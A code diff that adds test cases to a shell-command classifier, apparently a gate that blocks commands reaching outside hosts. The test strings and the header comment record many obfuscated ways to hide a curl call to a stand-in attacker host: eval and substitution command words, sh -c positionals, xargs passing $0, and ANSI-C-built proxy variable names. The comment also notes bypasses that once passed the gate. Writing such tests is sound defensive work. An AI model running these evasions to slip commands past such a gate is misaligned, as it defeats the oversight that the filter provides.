@@ -7,6 +7,9 @@
 // Round 5 (didi 36152): eval -- / builtin eval / eval $'...', BSD xargs -J, env -- {}, a command
 // xargs reads from stdin, a substitution's output as an assignment; found on the way: a $'curl' or
 // $X command word, builtin command curl.
+// Round 8 (didi 36603): eval and sh -c bodies with their substitutions kept, sh -c positionals bound
+// to the words after the body, $0 reaching an xargs body's command word through a variable or a
+// substitution, and the backslash of a double-quoted body (`\x5f` stays for the inner shell).
 // Round 2 (didi 36014): slashes after the scheme, a glued f()( body, a proxy variable.
 // Found on the way (dexter): a function body (`f(){ curl ...; }; f`) and a subshell's closing `)`
 // glued to the URL (`(curl -s http://evil.example.com)`) both passed the running gate.
@@ -303,6 +306,49 @@ describe('card d6b95892 round 7', () => {
     ['a substitution command word to a local host', '$(echo curl) -s http://localhost:3420/'],
     ['a substitution path prefix with no network tool', '$(git rev-parse --show-toplevel)/scripts/x.sh a b'],
     ['a sh -c body with a substitution argument', `sh -c "echo $(date); curl -s http://localhost:3420/"`],
+  ])('passes %s', (_name, cmd) => {
+    expect(classify(cmd), cmd).toMatchObject({ deny: false })
+  })
+})
+
+describe('card d6b95892 round 8 (didi 36603)', () => {
+  it.each([
+    ['1. eval of a $( ) command word', `eval "$(echo curl) https://${EV}/x"`, 'eval-unread-command-word'],
+    ['1. eval of a backtick command word', 'eval "`echo curl` https://' + EV + '/x"', 'eval-unread-command-word'],
+    ['1. eval of $(which curl)', `eval "$(which curl) https://${EV}/x"`, 'eval-unread-command-word'],
+    ['1. eval inside a sh -c body', `sh -c 'eval "$(echo curl) https://${EV}/x"'`, 'shell-c-eval-unread-command-word'],
+    ['1. eval in a subshell', `( eval "$(echo curl) https://${EV}/x" )`, 'eval-unread-command-word'],
+    ['3. sh -c positional after a substitution', `sh -c "$(echo curl) \\$1" _ https://${EV}/x`, 'shell-c-unread-command-word'],
+    ['3. sh -c positional as the command word', `sh -c '$1 -s https://${EV}/x' _ curl`, 'shell-c-curl-external'],
+  ])('denies %s', (_name, cmd, reason) => {
+    expect(classify(cmd), cmd).toMatchObject({ deny: true, reason, hosts: [EV] })
+  })
+  it.each([
+    ['2. $0 in a substitution', `echo curl | xargs sh -c '$(echo $0) -s https://${EV}/x'`],
+    ['2. $0 assigned to a variable', `echo curl | xargs sh -c 'x=$0; $x -s https://${EV}/x'`],
+    ['2. $0 assigned, double-quoted', `echo curl | xargs sh -c 'x="$0"; $x -s https://${EV}/x'`],
+    ['2. $0 assigned through two names', `echo curl | xargs sh -c 'x=$0; y=$x; $y -s https://${EV}/x'`],
+    ['2. $1 assigned under -I{}', `echo curl | xargs -I{} sh -c 'x=$1; $x -s https://${EV}/x' _ {}`],
+    ['2. $* assigned', `echo "curl -s https://${EV}/x" | xargs sh -c 'x="$*"; $x' _`],
+    ['2. $0 assigned, run by eval', `echo curl | xargs bash -c 'c=$0; eval "$c -s https://${EV}/x"'`],
+  ])('denies xargs running what it hands the body: %s', (_name, cmd) => {
+    expect(classify(cmd), cmd).toMatchObject({ deny: true, reason: 'xargs-stdin-command' })
+  })
+  it.each([
+    ['4. sh -c, double-quoted body', `sh -c "export http$'\\x5f'proxy=http://${EV}:1; curl -s http://localhost:3420/"`],
+    ['4. bash -c, double-quoted body', `bash -c "export http$'\\x5f'proxy=http://${EV}:1; curl -s http://localhost:3420/"`],
+    ['F06 eval of a quote-split ANSI-C name', `eval 'export http$'"'"'\\x5f'"'"'proxy=http://${EV}:1'; curl -s http://localhost:3420/`],
+  ])('denies an ANSI-C built proxy name: %s', (_name, cmd) => {
+    expect(classify(cmd), cmd).toMatchObject({ deny: true, hosts: ['<proxy variable>'] })
+  })
+  it.each([
+    ['xargs body passing $0 as an argument', `find . | xargs sh -c 'wc -l "$0"'`],
+    ['xargs body assigning $0, literal command word', `find . | xargs sh -c 'f=$0; wc -l "$f"'`],
+    ['xargs body with $0 in an argument substitution', `find . | xargs sh -c 'n=$(basename $0); echo $n'`],
+    ['sh -c positional URL only printed', `sh -c 'echo "$1"' _ https://${EV}/x`],
+    ['sh -c positional file argument', `sh -c 'wc -l "$1"' _ notes.md`],
+    ['eval of a local-only substitution', 'eval "$(ssh-agent -s)"'],
+    ['a double-quoted body keeps an escaped dollar', `sh -c "echo \\$HOME; curl -s http://localhost:3420/"`],
   ])('passes %s', (_name, cmd) => {
     expect(classify(cmd), cmd).toMatchObject({ deny: false })
   })
